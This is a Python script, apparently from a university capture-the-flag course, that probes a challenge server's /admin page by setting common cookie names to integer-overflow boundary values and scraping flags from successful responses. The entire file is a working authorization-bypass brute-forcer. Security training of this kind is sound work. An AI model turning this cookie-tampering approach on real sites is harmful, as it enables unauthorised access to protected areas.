#!/usr/bin/env python3
"""
Token Overflow Exploit
"""

import requests
import re

BASE_URL = "http://challenges.iik3100-h25.iaas.iik.ntnu.no:11080"

def test_overflow_with_cookie(cookie_name, cookie_value):
    """Test a specific cookie value."""
    cookies = {cookie_name: str(cookie_value)}
    try:
        response = requests.get(f"{BASE_URL}/admin", cookies=cookies, timeout=5)
        flags = re.findall(r'CTF\{[^}]+\}', response.text)
        
        if response.status_code == 200:
            print(f"[+] SUCCESS with {cookie_name}={cookie_value}")
            print(f"    Status: {response.status_code}")
            if flags:
                for flag in flags:
                    print(f"    ðŸš© FLAG: {flag}")
            return True, flags
        elif response.status_code != 403:
            print(f"[?] Interesting response with {cookie_name}={cookie_value}: {response.status_code}")
            
    except Exception as e:
        pass
    
    return False, []


def main():
    print("="*70)
    print("TOKEN OVERFLOW EXPLOIT")
    print("="*70)
    print()
    
    # Common cookie/token names
    token_names = [
        'token', 'access_token', 'auth_token', 'session_token',
        'id', 'user_id', 'uid', 'userid', 
        'session', 'session_id', 'sessionid',
        'access', 'access_level', 'level', 'role',
        'admin', 'is_admin', 'isadmin',
        'count', 'counter', 'visits', 'access_count'
    ]
    
    # Integer overflow boundary values
    test_values = [
        # Description, Value
        ("Zero", 0),
        ("One", 1),
        ("Negative one", -1),
        ("8-bit max", 255),
        ("8-bit overflow", 256),
        ("16-bit max", 32767),
        ("16-bit overflow", 32768),
        ("16-bit max unsigned", 65535),
        ("16-bit overflow unsigned", 65536),
        ("32-bit max", 2147483647),
        ("32-bit overflow (wraps to negative)", 2147483648),
        ("32-bit min", -2147483648),
        ("32-bit max unsigned", 4294967295),
        ("32-bit overflow unsigned", 4294967296),
        ("Large number", 999999),
        ("Large negative", -999999),
    ]
    
    all_flags = []
    
    print("[*] Testing overflow on different cookie names and values...")
    print()
    
    for token_name in token_names:
        for desc, value in test_values:
            success, flags = test_overflow_with_cookie(token_name, value)
            if success:
                all_flags.extend(flags)
                print()
    
    # Try combinations
    print("\n[*] Testing token combinations...")
    print()
    
    # Try setting multiple cookies at once
    for val1_desc, val1 in test_values[:8]:  # Test first 8 values
        cookies = {
            'token': str(val1),
            'id': str(val1),
            'access_level': str(val1)
        }
        try:
            response = requests.get(f"{BASE_URL}/admin", cookies=cookies, timeout=5)
            if response.status_code == 200:
                print(f"[+] SUCCESS with multiple cookies (value={val1}, {val1_desc})")
                flags = re.findall(r'CTF\{[^}]+\}', response.text)
                if flags:
                    for flag in flags:
                        print(f"    ðŸš© FLAG: {flag}")
                        all_flags.append(flag)
                print()
        except Exception:
            pass
    
    print("\n" + "="*70)
    print("RESULTS")
    print("="*70)
    
    if all_flags:
        print(f"\n[+] Found {len(all_flags)} flags:")
        for flag in set(all_flags):
            print(f"    ðŸš© {flag}")
    else:
        print("\n[-] No flags found through integer overflow")
        print("[*] The vulnerability might require a different approach:")
        print("    - Check if tokens are set client-side via JavaScript")
        print("    - Look for hidden form fields with token values")
        print("    - Check URL parameters instead of cookies")
        print("    - Try POST requests with token in body")


if __name__ == "__main__":
    main()
